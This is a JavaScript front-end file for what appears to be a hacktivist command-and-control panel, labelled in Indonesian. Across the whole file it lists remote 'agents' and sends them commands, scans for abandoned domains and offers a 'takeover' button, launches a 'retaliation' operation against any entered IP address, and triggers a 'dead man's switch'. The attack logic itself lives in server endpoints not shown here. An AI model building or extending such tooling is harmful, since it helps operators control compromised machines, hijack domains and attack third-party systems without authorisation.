// commander.js
let agents = [];
let zombieResults = [];

window.onload = function() {
  loadAgents();
  loadIntelFeed();
  checkDeadmanStatus();
  initMap();
  setInterval(loadAgents, 10000);
  setInterval(loadIntelFeed, 15000);
};

// Peta
function initMap() {
  const map = L.map('map').setView([20, 0], 2);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

  // Gaza
  L.marker([31.5, 34.5]).addTo(map)
    .bindPopup("🇵🇸 Gaza — Under Attack")
    .openPopup();

  // Jakarta
  L.marker([-6.2, 106.8]).addTo(map)
    .bindPopup("🇮🇩 Jakarta — Anti-Corruption Ops");
}

// Load Agents
function loadAgents() {
  fetch('/api/agents')
    .then(r => r.json())
    .then(data => {
      agents = data;
      const select = document.getElementById('agent-select');
      select.innerHTML = '<option value="">Pilih Agent</option>';
      data.forEach(a => {
        const opt = document.createElement('option');
        opt.value = a.id;
        opt.textContent = `${a.id} (${a.location})`;
        select.appendChild(opt);
      });
      updateAgentList(data);
    });
}

function updateAgentList(agents) {
  const list = document.getElementById('agent-list');
  list.innerHTML = agents.map(a => `
    <div class="agent-item">
      <b>[${a.id}]</b> ${a.location} | CPU: ${a.cpu}% | RAM: ${a.ram}%
      <span class="time">${a.last_seen}</span>
    </div>
  `).join('');
}

function loadAgentDetails() {
  const id = document.getElementById('agent-select').value;
  const details = document.getElementById('agent-details');
  if (!id) return;
  const agent = agents.find(a => a.id === id);
  details.innerHTML = `
    <p><b>Status:</b> ${agent.online ? '🟢 Online' : '🔴 Offline'}</p>
    <p><b>IP:</b> ${agent.ip}</p>
    <p><b>DSI:</b> ${agent.dsi}/100</p>
  `;
}

function sendCommand(cmd) {
  const agentId = document.getElementById('agent-select').value;
  if (!agentId) return alert("Pilih agent!");
  fetch('/api/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ agent_id: agentId, command: cmd })
  }).then(() => alert(`Perintah "${cmd}" dikirim`));
}

// Zombie Hunter
function scanZombie() {
  const keyword = document.getElementById('keyword').value || 'palestine';
  const resultsDiv = document.getElementById('zombie-results');
  resultsDiv.innerHTML = '🔍 Memindai...';

  fetch('/api/zombie/scan', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ keyword })
  })
  .then(r => r.json())
  .then(data => {
    resultsDiv.innerHTML = data.map(z => `
      <div class="zombie-item">
        <b>🧟 ${z.domain}</b> (${z.status})<br>
        <small>Risiko: ${z.risk.toUpperCase()}</small><br>
        <button onclick="takeover('${z.domain}')">🚀 Ambil Alaih</button>
      </div>
    `).join('');
  });
}

// Retaliation
function retaliate() {
  const ip = document.getElementById('retaliate-ip').value;
  if (!ip) return alert("Masukkan IP!");
  fetch('/api/retaliate', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ip })
  }).then(() => alert('⚔️ Operasi dimulai!'));
}

// Intel Feed
function loadIntelFeed() {
  fetch('/api/intel')
    .then(r => r.json())
    .then(data => {
      const feed = document.getElementById('intel-feed');
      feed.innerHTML = data.slice(0, 5).map(i => 
        `<p>⚠️ ${i.type}: ${i.message}</p>`
      ).join('');
    });
}

// Dead Man's Switch
function openModal() { document.getElementById('switch-modal').style.display = 'block'; }
function closeModal() { document.getElementById('switch-modal').style.display = 'none'; }
function activateSwitch() { openModal(); }
function confirmSwitch() {
  fetch('/api/deadman/activate', { method: 'POST' })
    .then(() => {
      alert("DEAD MAN'S SWITCH AKTIF");
      closeModal();
    });
}
function checkDeadmanStatus() {
  fetch('/api/deadman/status')
    .then(r => r.json())
    .then(data => {
      const btn = document.getElementById('switch-btn');
      btn.style.backgroundColor = data.active ? '#f00' : '#300';
    });
}